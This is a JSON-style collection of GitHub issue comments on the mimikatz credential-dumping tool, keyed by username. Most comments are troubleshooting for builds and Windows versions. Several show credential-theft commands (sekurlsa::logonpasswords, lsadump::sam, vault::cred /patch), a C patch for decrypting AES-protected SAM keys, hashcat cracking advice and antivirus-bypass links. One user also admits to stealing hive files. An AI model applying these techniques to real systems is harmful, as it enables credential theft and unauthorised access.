    "wwbbs": "Are you sure they are missing and not just a character set problem. Try\npiping output to a file and check.\nOn May 8, 2017 8:47 AM, \"Itamar\" notifications@github.com wrote:\n\nHi,\nI noticed that sekurlsa module ignores non-unicode characters and displays\nnothing in case either the username or the password configured differently.\nIn the image attached, you can see a screen shot of dumping credentials,\nthe username and password were written in Hebrew, so they do not appear in\nthe dump.\n[image: nopass]\nhttps://cloud.githubusercontent.com/assets/15673250/25804570/07bba3f4-3405-11e7-912f-428290af7b82.png\n\u2014\nYou are receiving this because you are subscribed to this thread.\nReply to this email directly, view it on GitHub\nhttps://github.com/gentilkiwi/mimikatz/issues/87, or mute the thread\nhttps://github.com/notifications/unsubscribe-auth/AQMASKmKdAtbEgD5vyqgiHmxLmpRzkkgks5r3w7TgaJpZM4NT5hH\n.\n. Then it is a character set issue, Can those same characters be displayed /\nentered into the console your using?\n\nOn May 8, 2017 10:30 AM, \"Itamar\" notifications@github.com wrote:\n\nPiped the output to a log file, and it still ignores the Hebrew letters.\nIn mimikatz source code, it casts the username to UNICODE_STRING\nstructure, so I don't think you can put in it non Latin language characters.\n[image: nopass]\nhttps://cloud.githubusercontent.com/assets/15673250/25808712/99ff97c6-3413-11e7-8396-96bf9d1cb18b.png\n\u2014\nYou are receiving this because you commented.\nReply to this email directly, view it on GitHub\nhttps://github.com/gentilkiwi/mimikatz/issues/87#issuecomment-299883031,\nor mute the thread\nhttps://github.com/notifications/unsubscribe-auth/AQMASCbiyel33L3MGU2nuuFsMp6P_lLIks5r3yb5gaJpZM4NT5hH\n.\n. \n",
    "MrAnde7son": "Piped the output to a log file, and it still ignores the Hebrew letters.\nIn mimikatz source code, it casts the username to UNICODE_STRING structure, so I don't think you can put in it non Latin language characters.\n\n. How come the result changes depending on the font?. I see. Thanks!. ",
    "BeanBagKing": "I'll add this here, since it is also a typo on the same page and I don't believe it worth adding a new issue.\nmimikatz # lsadump::sam SystemBkup.hiv SamBkup.hiv\nshould be \nmimikatz # lsadump::sam /system:SystemBkup.hiv /sam:SamBkup.hiv\nPer this thread: https://github.com/gentilkiwi/mimikatz/issues/80. ",
    "sayak-brm": "Win10 x64 with Creators Update. Executed via admin PowerShell. I downloaded the latest version and tried with it, but I got the same\nresults. :(\nOn Jun 14, 2017 12:07 AM, \"Benjamin DELPY\" notifications@github.com wrote:\n\nHello :)\nMaybe take a look at: https://github.com/gentilkiwi/\nmimikatz/wiki/howto-~-open-an-issue#check-you-use-latest-mimikatz-version\nAnd try first with an original version of mimikatz ;)\n\u2014\nYou are receiving this because you authored the thread.\nReply to this email directly, view it on GitHub\nhttps://github.com/gentilkiwi/mimikatz/issues/90#issuecomment-308208956,\nor mute the thread\nhttps://github.com/notifications/unsubscribe-auth/AFtxDBB74Pcjkn8ZYb1_U0h8D4yRlYlOks5sDtbZgaJpZM4N4Yxn\n.\n. But I'm on Win10 1703 (Creators Update) and I too get the error...\n. \n",
    "dhagrow": "I'm not sure if it's related, but I'm seeing the same error on:\nMicrosoft Windows 8.1 Pro (6.3.9600 Build 9600) x86 English\n\nSP0 & SP1 (But not on 8.0, or 8.1 x64)\nThis is executed directly, not using Powershell.\n``\n  .#####.   mimikatz 2.1.1 (x86) built on Jun 18 2017 18:46:12\n .## ^ ##.  \"A La Vie, A L'Amour\"\n ## / \\ ##  /* * *\n ## \\ / ##   Benjamin DELPYgentilkiwi` ( benjamin@gentilkiwi.com )\n '## v ##'   http://blog.gentilkiwi.com/mimikatz             (oe.eo)\n  '#####'                                     with 21 modules *  /\nmimikatz # privilege::debug\nPrivilege '20' OK\nmimikatz # sekurlsa::logonpasswords\nERROR kuhl_m_sekurlsa_acquireLSA ; Logon list\n```. It looks like an issue with older versions of 8.1 then.\nSP0 (fresh install):\n\nSP1\n\n. ",
    "huzaifah0x00": "same problem windows 10 64-bit Creator update;\ninvoke-mimkatz gave me the same error but the full version worked ...(at least without errors). ",
    "jomivz": "https://twitter.com/jomivz/status/877880529386840065\n. ",
    "JeffAWarren": "I may have misunderstood the intent of this command.  I thought it would update the NTLM for a user without triggering the SETPASSWORD flag and avoid detection in event logs. . ",
    "dcnoren": "If I understand your question properly, I think you're looking for a password to dump when the user doesn't have an actual password and is using Windows Hello instead? Given that MS is moving towards certificates for this, you need to dump a certificate and private key instead. Try:\ncrypto::capi\ncrypto::cng\ncrypto::certificates /export. ",
    "esfomeado": "I have the same problem on one of my machines.. Yes @TalkL3ss. ",
    "TalkL3ss": "runas admin + privilege::debug?. ",
    "marcusguita": "Try to use this sintaxe: lsadump::sam /system:SYSTEM.hiv /SAM:SAM.hiv\n(SYTEM.hiv and SAM,hiv are your dump files)\nAbout this https://github.com/gentilkiwi/mimikatz/issues/80. ",
    "marianoka": "Hi!\nI'm getting the same issue.\nmimikatz # lsadump::sam /system:SYSTEM.hiv /SAM:SAM.hiv\nERROR kuhl_m_lsadump_sam ; CreateFile (SYSTEM hive) (0x00000002)\nFiles are located at root directory where mimikatz  is . (c:\\mimikatz)\nAny idea?\nThanks. ",
    "TheTrollCaptain": "@gentilkiwi Hello!\nI got that error too. Console spits out:\n\"SAMKey : ERROR kuhl_m_lsadump_getSamKey ; Unknow Classic Struct Key revision (2)\nERROR kuhl_m_lsadump_getUsersAndSamKey ; kuhl_m_lsadump_getSamKey KO\"\nIf you're interested, which files would you need to see?\nEDIT: It seems to be the SAM file throwing the error... this is the SAM file I extracted from my Windows 10 Enterprise machine\nSAM.zip\nand SYSTEM file\nSYSTEM.zip\n. ",
    "uriyay": "Solved it by adding handling revision 2 in kuhl_m_lsadump_getSamKey:\ncase 2:\n            if(pDomAccF->keys1.Revision == 1)\n            {\n                MD5Init(&md5ctx);\n                MD5Update(&md5ctx, pDomAccF->keys1.Salt, SAM_KEY_DATA_SALT_LENGTH);\n                MD5Update(&md5ctx, kuhl_m_lsadump_qwertyuiopazxc, sizeof(kuhl_m_lsadump_qwertyuiopazxc));\n                MD5Update(&md5ctx, sysKey, SYSKEY_LENGTH);\n                MD5Update(&md5ctx, kuhl_m_lsadump_01234567890123, sizeof(kuhl_m_lsadump_01234567890123));\n                MD5Final(&md5ctx);\n                RtlCopyMemory(samKey, pDomAccF->keys1.Key, SAM_KEY_DATA_KEY_LENGTH);\n                if(!(status = NT_SUCCESS(RtlEncryptDecryptRC4(&data, &key))))\n                    PRINT_ERROR(L\"RtlEncryptDecryptRC4 KO\");\n            }\n            else if (pDomAccF->keys1.Revision == 2) {\n                pAesKey = (PSAM_KEY_DATA_AES)&pDomAccF->keys1;\n                if (kull_m_crypto_genericAES128Decrypt(sysKey, pAesKey->Salt, pAesKey->data, pAesKey->DataLen, &out, &len))\n                {\n                    if (status = (len == SAM_KEY_DATA_KEY_LENGTH))\n                        RtlCopyMemory(samKey, out, SAM_KEY_DATA_KEY_LENGTH);\n                    LocalFree(out);\n                }\n            }. ",
    "TylerD89": "Thanks man! Put that to good use!. ",
    "0xVIC": "Thank you, very useful!. ",
    "afernandezb92": "\nSolved it by adding handling revision 2 in kuhl_m_lsadump_getSamKey:\ncase 2:\n          if(pDomAccF->keys1.Revision == 1)\n          {\n              MD5Init(&md5ctx);\n              MD5Update(&md5ctx, pDomAccF->keys1.Salt, SAM_KEY_DATA_SALT_LENGTH);\n              MD5Update(&md5ctx, kuhl_m_lsadump_qwertyuiopazxc, sizeof(kuhl_m_lsadump_qwertyuiopazxc));\n              MD5Update(&md5ctx, sysKey, SYSKEY_LENGTH);\n              MD5Update(&md5ctx, kuhl_m_lsadump_01234567890123, sizeof(kuhl_m_lsadump_01234567890123));\n              MD5Final(&md5ctx);\n              RtlCopyMemory(samKey, pDomAccF->keys1.Key, SAM_KEY_DATA_KEY_LENGTH);\n              if(!(status = NT_SUCCESS(RtlEncryptDecryptRC4(&data, &key))))\n                  PRINT_ERROR(L\"RtlEncryptDecryptRC4 KO\");\n          }\n          else if (pDomAccF->keys1.Revision == 2) {\n              pAesKey = (PSAM_KEY_DATA_AES)&pDomAccF->keys1;\n              if (kull_m_crypto_genericAES128Decrypt(sysKey, pAesKey->Salt, pAesKey->data, pAesKey->DataLen, &out, &len))\n              {\n                  if (status = (len == SAM_KEY_DATA_KEY_LENGTH))\n                      RtlCopyMemory(samKey, out, SAM_KEY_DATA_KEY_LENGTH);\n                  LocalFree(out);\n              }\n          }\n\nThank so muchs, its works!!!. ",
    "Meatballs1": "I wasn't sure if it was affecting my ability to auth - although I think my main issue is 'CLDAP' UDP packets being used by Windows/Kekeo when I'm sending everything over a proxy. Might need to hardcode some Kerberos settings on the Windows machine so it doesn't try CLDAP (RootDSE Query?)\n. ",
    "edermi": "Hi Benjamin, thanks for your fast reply.\nI tried to dump credentials from scheduled tasks as described in the wiki. What probably caused confusion is that I unfortunately do not see any file in %systemroot%\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\Credentials, I just verified again on a DC and a member server in my test domain (well, on another DC, there is such a file but only containing one credential while more than one scheduled task is configured). Following this Stackexchange thread I assumed that %APPDATA%\\Microsoft\\Protect\\ contains the same data.\nDo you know why I do not have dpapi blobs on some servers in the directory where they should be (despite active scheduled tasks)?\nMy colleague is researching on a similar subject - he also tries to obtain credentials from a scheduled task which is created and run by a privileged user, but he is not able to find the dpapi blobs.\nBTW, while I'm already here: Thanks for your awesome work! =). Sorry for coming back quite late..\nI just made a few more experiments. Running your command gives me the following output for the XML's Principals section:\n<Principals>\n   <Principal id=\"Author\">\n     <RunLevel>HighestAvailable</RunLevel>\n     <UserId>NT AUTHORITY\\System</UserId>\n     <LogonType>S4U</LogonType>\n   </Principal>\n </Principals>\nSo I guess there are no credentials because the task runs as SYSTEM. I created another task on a remote machine with:\nPS C:\\Windows\\system32> schtasks /create /S <dc>.<domain> /SC DAILY /RU \"ad-eder\" /TN \"Evil Task\" /TR \"C:\\Temp\\mimikatz_trunk\\x64\\mimikatz.exe\"\nJust for testing purposes, I logged in and changed the task to run whether the user is logged in or not and provided correct credentials - but I see the username as UserId and vault::cred is not able to extract the credentials, but vault::cred /patch works.\nSo, I guess SYSTEM user has simply no credentials and the tasks I tried to dump from were all running as SYSTEM...\nJust out of curiosity, I have one more questions which I'm not certain about: Does vault::cred or vault::cred /patch dump credentials from scheduled tasks that run under a service user? We tried to do this to obtain the credentials of a managed service account but failed.\n. I am having the same issue on Server 2k12 and Windows 10. @johnjohnsp1 Indeed, the patch fixes the problem for me. Thank you!. ",
    "linxack": "How cute...\ud83e\udd17. ",
    "xeddmc": ". ",
    "nest-aka-swan": "@moaeddy there is a good article on this topic https://www.blackhillsinfosec.com/bypass-anti-virus-run-mimikatz/. ",
    "johnjohnsp1": "I did another try to compile it with another Virtual machine but still getting the same output:\n```\n1>------ Build started: Project: mimikatz, Configuration: Release Win32 ------\n2>------ Build started: Project: mimilib, Configuration: Release Win32 ------\n2>  kappfree.c\n2>  kdhcp.c\n2>  kdns.c\n2>  kfilt.c\n2>  kssp.c\n2>  kuhl_m_sekurlsa_nt6.c\n2>  kuhl_m_sekurlsa_packages.c\n2>  kuhl_m_sekurlsa_utils.c\n2>  kull_m_rpc.c\n2>  kull_m_rpc_ms-credentialkeys.c\n2>  kwindbg.c\n2>  utils.c\n2>     Creating library C:\\temp\\mimikatz-2.1.1-20171220\\Win32\\mimilib.lib and object C:\\temp\\mimikatz-2.1.1-20171220\\Win32\\mimilib.exp\n2>  Generating code\n2>  Finished generating code\n2>  mimilib.vcxproj -> C:\\temp\\mimikatz-2.1.1-20171220\\Win32\\mimilib.dll\n3>------ Build started: Project: mimidrv, Configuration: Release Win32 ------\n1>  kull_m_asn1.c\n1>  kull_m_busylight.c\n1>  kull_m_cabinet.c\n1>  kull_m_cred.c\n1>  kull_m_crypto.c\n1>  kull_m_dpapi.c\n1>  kull_m_file.c\n1>  kull_m_handle.c\n1>  kull_m_kernel.c\n1>  kull_m_key.c\n1>  kull_m_net.c\n1>  kull_m_memory.c\n1>  kull_m_minidump.c\n1>  kull_m_output.c\n1>  kull_m_patch.c\n1>  kull_m_process.c\n1>  kull_m_registry.c\n1>  kull_m_remotelib.c\n1>  kull_m_sr98.c\n1>  kull_m_rpc.c\n1>  Compiling...\n1>  kull_m_rpc_bkrp.c\n1>  kull_m_rpc_dpapi-entries.c\n1>  kull_m_rpc_drsr.c\n3>  Starting dirs creation...Completed.\n3>  BUILD: Compile and Link for x86\n3>\n3>  BUILD: Computing Include file dependencies:\n3>\n1>  kull_m_rpc_mimicom.c\n1>  kull_m_rpc_ms-bkrp_c.c\n1>  kull_m_rpc_ms-claims.c\n1>  kull_m_rpc_ms-credentialkeys.c\n1>  kull_m_rpc_ms-drsr_c.c\n1>  kull_m_rpc_ms-pac.c\n1>  kull_m_service.c\n1>  kull_m_string.c\n3>  BUILD: Start time: Wed Dec 20 10:36:39 2017\n3>  BUILD: null byte at offset 0x00000003\n3>\n3>  BUILD: 972 null bytes in file\n3>\n3>  BUILD: Examining c:\\temp\\mimikatz-2.1.1-20171220\\mimidrv directory for files to compile.\n3>\n3>      c:\\temp\\mimikatz-2.1.1-20171220\\mimidrv \n3>\n3>  BUILD: Saving c:\\winddk\\7600.16385.1\\build.dat...\n3>\n3>  BUILD: Compiling and Linking c:\\temp\\mimikatz-2.1.1-20171220\\mimidrv directory\n3>\n1>  kull_m_token.c\n3>  _NT_TARGET_VERSION SET TO WS03\n3>  Compiling resources - mimidrv.rc\n1>  kull_m_xml.c\n3>  Compiling - mimidrv.c\n3>  Compiling - kkll_m_process.c\n1>  mimikatz.c\n3>  Compiling - kkll_m_modules.c\n3>  Compiling - kkll_m_memory.c\n3>  Compiling - kkll_m_ssdt.c\n1>  kuhl_m_crypto_extractor.c\n3>  Compiling - kkll_m_notify.c\n3>  Compiling - kkll_m_filters.c\n1>  kuhl_m_crypto_patch.c\n3>  Compiling - generating code...\n1>  kuhl_m_dpapi.c\n3>  Linking Executable - objfre_wnet_x86\\i386\\mimidrv.sys\n3>  BUILD: Finish time: Wed Dec 20 10:36:42 2017\n3>  BUILD: Done\n3>\n3>\n3>\n3>      10 files compiled - 663 LPS\n3>\n3>      1 executable built\n3>\n3>  C:\\temp\\mimikatz-2.1.1-20171220\\mimidrv\\objfre_wnet_x86\\i386\\mimidrv.sys\n3>          1 file copiati.\n4>------ Build started: Project: mimilove, Configuration: Release Win32 ------\n4>  kull_m_kernel.c\n1>  kuhl_m_dpapi_oe.c\n4>  kull_m_memory.c\n1>  kuhl_m_dpapi_chrome.c\n4>  kull_m_minidump.c\n1>  kuhl_m_dpapi_creds.c\n1>  Compiling...\n1>  kuhl_m_dpapi_keys.c\n4>  kull_m_output.c\n1>  kuhl_m_dpapi_wlan.c\n4>  kull_m_process.c\n4>  kull_m_string.c\n1>  kuhl_m_kerberos.c\n4>  mimilove.c\n1>  kuhl_m_kerberos_ccache.c\n1>  kuhl_m_kerberos_claims.c\n1>  kuhl_m_kerberos_pac.c\n1>  kuhl_m_kerberos_ticket.c\n1>  kuhl_m_busylight.c\n1>  kuhl_m_crypto.c\n1>  kuhl_m_event.c\n1>  kuhl_m_iis.c\n4>  Generating code\n4>  Finished generating code\n1>  kuhl_m_kernel.c\n4>  mimilove.vcxproj -> C:\\temp\\mimikatz-2.1.1-20171220\\Win32\\mimilove.exe\n1>  kuhl_m_lsadump.c\n1>  kuhl_m_lsadump_remote.c\n1>  kuhl_m_misc.c\n1>  kuhl_m_net.c\n1>  kuhl_m_privilege.c\n1>  kuhl_m_process.c\n1>  kuhl_m_rpc.c\n1>  kuhl_m_service.c\n1>  Compiling...\n1>  kuhl_m_service_remote.c\n1>  kuhl_m_sid.c\n1>  kuhl_m_standard.c\n1>  kuhl_m_sysenvvalue.c\n1>  kuhl_m_token.c\n1>  kuhl_m_ts.c\n1>  kuhl_m_vault.c\n1>  kuhl_m_minesweeper.c\n1>  kuhl_m_lsadump_dc.c\n1>  kuhl_m_sekurlsa_nt5.c\n1>  kuhl_m_sekurlsa_nt6.c\n1>  kuhl_m_sekurlsa_nt63.c\n1>  kuhl_m_sekurlsa.c\n1>  kuhl_m_sekurlsa_utils.c\n1>  kuhl_m_sekurlsa_credman.c\n1>  kuhl_m_sekurlsa_dpapi.c\n1>  kuhl_m_sekurlsa_kerberos.c\n1>  kuhl_m_sekurlsa_livessp.c\n1>  kuhl_m_sekurlsa_msv1_0.c\n1>  kuhl_m_sekurlsa_ssp.c\n1>  Compiling...\n1>  kuhl_m_sekurlsa_tspkg.c\n1>  kuhl_m_sekurlsa_wdigest.c\n1>  sqlite3_omit.c\n1>LINK : fatal error LNK1181: cannot open input file 'fltlib.lib'\n========== Build: 3 succeeded, 1 failed, 0 up-to-date, 0 skipped ==========\nOS:Windows 7 Professional\nVer = \"6.1.7601.17514\"\nMicrosoft Visual Studio Express 2013 for Windows Desktop\nVersion 12.0.40629.00 Update 5\nMicrosoft .NET Framework\nVersion 4.6.01055\nInstalled Version: Desktop Express\nTeam Explorer for Visual Studio 2013   06157-004-0441005-02320\nMicrosoft Team Explorer for Visual Studio 2013\nVisual Basic 2013   06157-004-0441005-02320\nMicrosoft Visual Basic 2013\nVisual C# 2013   06157-004-0441005-02320\nMicrosoft Visual C# 2013\nVisual C++ 2013   06157-004-0441005-02320\nMicrosoft Visual C++ 2013\nCommon Azure Tools   1.6\nProvides common services for use by Azure Mobile Services and Microsoft Azure Tools.\nNuGet Package Manager   2.12.0.817\nNuGet Package Manager in Visual Studio. For more information about NuGet, visit http://docs.nuget.org/.\nSQL Server Data Tools   12.0.61021.0\nMicrosoft SQL Server Data Tools\n```\nanything I do wrong ? Until this release 20170813 I was able to compile it with VS2017\nthanks \n. Thanks for the fast replay Benjamin, made a donation you should receive that from paypal hope it's appreciated.. Once you have the WINDDK installed you can grab a copy of that file from this folder: \nC:\\WinDDK\\7600.16385.1\\lib\\\nor\ncan just do a search on your system drive  --> folder C:\\program files* for it\n. i see Benjamin have updated the repo, just clone it again from source and you will see the file missing is there.. thanks for the help Crypto-M3lon with your modify applied to the mimikatz.c code now the generated file mimikatz.dll is working pretty well !!. I can confirm applying the modify to the source code mimikatz.c with this reference \"@Crypt0-M3lon Crypt0-M3lon referenced this issue on 3 May\n Open\nFix console I/O with Simple DLL build #148\" will fix the problem.\nThe part is at the bottom of the mimikatz.c\nvoid CALLBACK mimikatz_dll(HWND hwnd, HINSTANCE hinst, LPWSTR lpszCmdLine, int nCmdShow)\n{\n    FILE * pNewStdout;\n    FILE * pNewStderr;\n    FILE * pNewStdin;\nint argc = 0;\nwchar_t ** argv;\n\nif (AllocConsole())\n{\n    freopen_s(&pNewStdout, \"CONOUT$\", \"w\", stdout);\n    freopen_s(&pNewStderr, \"CONOUT$\", \"w\", stderr);\n    freopen_s(&pNewStdin, \"CONIN$\", \"r\", stdin);\n\n    if (lpszCmdLine && lstrlenW(lpszCmdLine))\n    {\n        if (argv = CommandLineToArgvW(lpszCmdLine, &argc))\n        {\n            wmain(argc, argv);\n            LocalFree(argv);\n        }\n    }\n    else wmain(0, NULL);\n}\n\n}\nendif\n. Load the project then select Mimikatz on the right side then properties.\nUnder the menu on the left C/C++ just turn off the warning level by set it up \u201cOFF\u201d\nThen just compile \n\nIl giorno 27 set 2018, alle ore 15:48, taherkaraki notifications@github.com ha scritto:\nI fixed it a couple of builds ago by replacing the following line:\nret = swscanf_s(theArg, L\"%[^:]:%[^:]:%s\", bSalt, ARRAYSIZE(bSalt), bAes256, ARRAYSIZE(bAes256), bAes128, ARRAYSIZE(bAes128));\nWith:\nret = swscanf_s(theArg, L\"%[^:]:%[^:]:%s\", bSalt, (UINT)ARRAYSIZE(bSalt), bAes256, (UINT)ARRAYSIZE(bAes256), bAes128, (UINT)ARRAYSIZE(bAes128));\nAfter you fix it, you will get a similar error in another file as far as I remember. So simply do the same.\n\u2014\nYou are receiving this because you are subscribed to this thread.\nReply to this email directly, view it on GitHub https://github.com/gentilkiwi/mimikatz/issues/172#issuecomment-425099215, or mute the thread https://github.com/notifications/unsubscribe-auth/ABzSV7tz6yALZJvi02CaA54nB2dVMQUVks5ufNcXgaJpZM4W7n2O.\n\n\n. ",
    "azzarin": "I have the same issue. So i follow this one. I didnt notice, but i have Visual Studio Community 2017 Edition. I must have reinstalled VS on this PC. Coffee time. . ",
    "local-uan": "This version also can't clear the log \nwin10 x64 16299. ",
    "xcy7e": "PLEASE remove me from this mailing list as I unsubscribed a few dozen times\nwithout success!!\nAm 15.01.2018 03:09 schrieb \"Benjamin DELPY\" notifications@github.com:\n\nClosed #125 https://github.com/gentilkiwi/mimikatz/issues/125.\n\u2014\nYou are receiving this because you are subscribed to this thread.\nReply to this email directly, view it on GitHub\nhttps://github.com/gentilkiwi/mimikatz/issues/125#event-1423565169, or mute\nthe thread\nhttps://github.com/notifications/unsubscribe-auth/AFZP_bkdoVD13O_ykhI9_4C603y3Xr73ks5tKrNvgaJpZM4Rduk4\n.\n. It is technically impossible to unsubscribe from this list, right? I tested\na dozen times over a period of 3 months. My Emails regarding this were kept\nunanswered.\nCan anyone please help me? PLEASE :(\n\nIf it's about saving bits, we all should care!\n2018-02-16 23:04 GMT+01:00 rotateLeft notifications@github.com:\n\nBruce Lee Says Srsly?\nhttps://media.giphy.com/media/MWdOypvVKhOOpn1E4h/giphy.gif\n\u2014\nYou are receiving this because you are subscribed to this thread.\nReply to this email directly, view it on GitHub\nhttps://github.com/gentilkiwi/mimikatz/issues/129#issuecomment-366371632,\nor mute the thread\nhttps://github.com/notifications/unsubscribe-auth/AFZP_dYI-D6bgJvUb9-Zyj1o7kSqxb3Oks5tVftVgaJpZM4SASn9\n.\n. \n",
    "bao7uo": "A hash is non-reversible which means that you cannot convert it back to the password. However, you might be able to crack it, depending on the complexity of the original password. There are free password cracking tools available online. Alternatively if it isn't sensitive, try Googling the hash, or find a site with lists of cracked hashes, perhaps someone has already cracked it and posted the corresponding password online. As far as Mimikatz is concerned, it does have a pass-the-hash feature, which sort of allows you to log on with the hash instead of the password in certain scenarios.. ",
    "cnotin": "I confirm the issue (black screen, no stdout/stdin) on Win7 x64 with the 32 and 64 bits versions of the mimikatz DLL.\nI confirm that the PR #148 fixes it, with both x86 and x64.. ",
    "rotateLeft": "+1. Trying to find an older 2.0 alpha release for testing. Looks like i'm SOL.. . ",
    "wheelerlaw": "The GIF is cute, but would you care to offer an explanation using language like an adult? Or is that too much to ask for?. ",
    "dodoaska": "mimikatz was fixed by microsoft and on the updated OS does not work anymore. ",
    "kmanc": "Hey @gentilkiwi is there a reason you didn't just merge my PR?. ",
    "Beercow": "There is a nice article here:\nhttps://adsecurity.org/?page_id=1821. ",
    "FFY00": "@Beercow, thank you! That is certainly helpful, however I was looking to something more in-depth. I am particularly interested in the vulnerability. Perhaps something more technical on extracting passwords from LSASS. It doesn't need to be directly related to mimikatz. But anyway, thank you. That article was more helpful that anything I was able to find. Even though it doesn't go into detail, it does explain how it works.. Yes. The code doesn't look that complicated, at least the bit I am interested (sekurlsa::logonpasswords). The problem is understanding why is it done and why it works. This is a really technical question but if @gentilkiwi wrote this to learn C, there must be some paper(s) already written about this.. ",
    "dhruvmalik007": "It seems that we have to decipher this masterpiece. it's obfuscation of code and technical complexity requires team  of researchers. Well i try my best to give my overview (if i got a sense of what the heck it really exploits)\n. http://forensicmethods.com/wp-content/uploads/2014/07/PassTheGolden_Ticket_v1_0.pdf.  this also gives a heck lot of information\n. ",
    "scopolamin": "sad but true. ",
    "inigma117": "Do you know what patch and OS versions are affected? I would be interested in knowing more about this.. ",
    "ioxterminal": "sure, no problem.\nServer 2016\n\nWindows 7\n\n. sure. Where can I find these files? When I run version /full /cab I see a lot of dll access in process monitor but no cab files are written. . I found them, thank you. I was running mimikatz from a network share and somehow the cab dump did not work. After running it from a local drive it worked\nServer 2016 & Windows 7\nhttps://1drv.ms/f/s!AmxyeSt-CJfMguh0WKfTyJ3Na_EGpw. ",
    "lsoumille": "Hi @gentilkiwi @ioxterminal \nI'm getting the same behavior on WServer 2016 fully patched with Windows Defender enabled.\nAny progress on this ?\nThanks\n. ",
    "tinyapps": "@TheWolfH - The /kiwi switch has apparently been available in stock mimikatz since at least May 2018; see hft's answer. I tested it successfully with version 2.1.1 from December 9, 2018.. ",
    "gettalong": "Thanks for your quick reply!\nYour comment makes it clear that transferring the Kerberos keys won't be possible since we indeed change the domain name. What we will probably do is making the transition to the new AD first and in a second step give the users some months to change/set their passwords so that we can disable RC4-HMAC later.. ",
    "GuyTe": "Actually the domain name change should not be an issue, as the domain name is stored in the \nKERB_STORED_CREDENTIAL struct (part of supplementalCredentials blob):\nhttps://msdn.microsoft.com/en-us/library/cc245503.aspx\nKDC will use the value stored in the DefaultSalt field (event if it differs from the actual Kerberos realm) when decrypting the hashes, so in theory, you might get away with injecting the supplementalCredentials from the original AD.. ",
    "kyhwana": "Success!\nsekurlsa::logonpasswords\nAuthentication Id : 0 ; 224904 (00000000:00036e88)\nSession           : Interactive from 1\nUser Name         : kyhwana\nDomain            : LION\nLogon Server      : LION\netcetc\nAlso turns out the new anti-lsass dumping ASR's aren't actually active in 1803: https://twitter.com/jepayneMSFT/status/991462793323790336?s=20\n. ",
    "rajiv2790": "I am using OS and build number, however it is working for me. Although I am dumping local account credentials. May be. I might have misunderstood then. I thought so because everytime I run mimikatz, windows event log is generated for SeTCBPrivilege check.\nThanks for the response. ",
    "meetinnet": "Windows 10 pro 1803 \nDoesn't work for me, passwords are null or Hex.\nM$ changed something on this version ?. ",
    "billybob3": "Passwords are no longer clear text.  They are NTLM (-m 1000 in hashcat).  Won't take but a minute to crack it.. You should now see a 32 character numerical string.  This is an NTLM password.  Use hashcat to crack it with the -m 1000 hash mode flag.  It will take about a minute if you have a password cracking Linux box setup with 4 GPUs.  Longer if you are running a single or older GPUs. . ",
    "lawrencer1989": "After more testing, i found the files were corrupt.. ",
    "edepree": "@gentilkiwi thank you for your quick resolution to this issue!. ",
    "alasta": "For me, the SeTCBPrivilege is a option which provide if the Service make a PAC (Privilege Account Certificate) validation. It a feature to prevent PAC forgery. \nThis link explain this : https://blogs.msdn.microsoft.com/openspecification/2009/04/24/understanding-microsoft-kerberos-pac-validation/\n. ",
    "abend9999": "Sorry,I misstook options.. ",
    "robemmerson": "I would recommend that you check https://hashcat.net/wiki/doku.php?id=example_hashes. The hash type is specified within the information you provided.. ",
    "Fireflaker": "Thank you!. ",
    "airhack87": "yes, just saw that in the windows error code , but the account that I am using is an Domain admin account\nhttps://infosys.beckhoff.com/english.php?content=../content/1033/tf6340_tc3_serial_communication/27021598155389323.html&id=1467695690985181762\n. In the wireshark trace, I see the following error\nkrb5_krb_ap_err_modified. I found this on @PyroTek3 blog, So are we saying that you cannot pass a silver/service ticket to a AD LDAP service even if its generated from the hash of domain admin ??\nIs silver ticket only for non-AD services, and can only be used against the registered SPN from which it was extracted ?\n\n. Is it only for the LDAP service that you need the DC computer hash instead of a domain admin hash to generate the silver ticket ?. ",
    "TurboSpencer96": "Here:\n\nmimikatz 2.1.1 (arch x64)\nWindows NT 10.0 build 16299 (arch x64)\nmsvc 150030729 207\nlsasrv.dll      : 10.0.16299.125\nmsv1_0.dll      : 10.0.16299.19\ntspkg.dll       : 10.0.16299.15\nwdigest.dll     : 10.0.16299.15\nkerberos.dll    : 10.0.16299.15\ndpapisrv.dll    : 10.0.16299.15\ncryptdll.dll    : 10.0.16299.15\nsamsrv.dll      : 10.0.16299.98\nrsaenh.dll      : 10.0.16299.15\nncrypt.dll      : 10.0.16299.15\nncryptprov.dll  : 10.0.16299.15\nwevtsvc.dll     : 10.0.16299.15\ntermsrv.dll     : 10.0.16299.15\nCAB: mimikatz_x64_sysfiles_16299\n -> lsasrv.dll\n -> msv1_0.dll\n -> tspkg.dll\n -> wdigest.dll\n -> kerberos.dll\n -> dpapisrv.dll\n -> cryptdll.dll\n -> samsrv.dll\n -> rsaenh.dll\n -> ncrypt.dll\n -> ncryptprov.dll\n -> wevtsvc.dll\n -> termsrv.dll\n\nAnd I cannot give you these files by 2 reasons:\n1. I don't have SECURITY file because I stole these files from one computer few months ago and now I do not have acces to it\n2. These files store one password that is very important to me and no one should know about it.\nI read some about one update for win7 that makes every program for dumping (I tried ophcrack) shows that every user have empty password (but that's not true of course). So, I think dumping hashes from these files are little more diffucult, but what's interesting, mimikatz found one hash for user what is the main administrator, maybe here I include a screenshot:\nhttps://s5.postimg.cc/mli6luevr/mimi.png\nAs you can see, mimikatz found one hash for Administrator but couldn't find hash for J11 user, shows me that Error. Can you help?. Please help! I really need the hash from this user and no other program than mimikatz can dump hashes after win7 security update!. Anyone here? Please, I'm still waiting for help :/. ",
    "TheNaterz": "Weird, came back today and couldn't even replicate. If I see it again, I'll keep an eye out for any secrets. Thanks!. ",
    "jagotu": "@TheNaterz I did some research into TBAL and published my results here: https://vztekoverflow.com/tbal. @gentilkiwi Sample registry hives to test parsing msv1_0 tbal secret:\nhttps://vztekoverflow.com/files/tbal/1709.zip\nhttps://vztekoverflow.com/files/tbal/1803.zip. ",
    "VillaStrayligh7": "Ah!  Very nice write up by harmj0y here: https://posts.specterops.io/operational-guidance-for-offensive-user-dpapi-abuse-1fb7fac8b107\n. ",
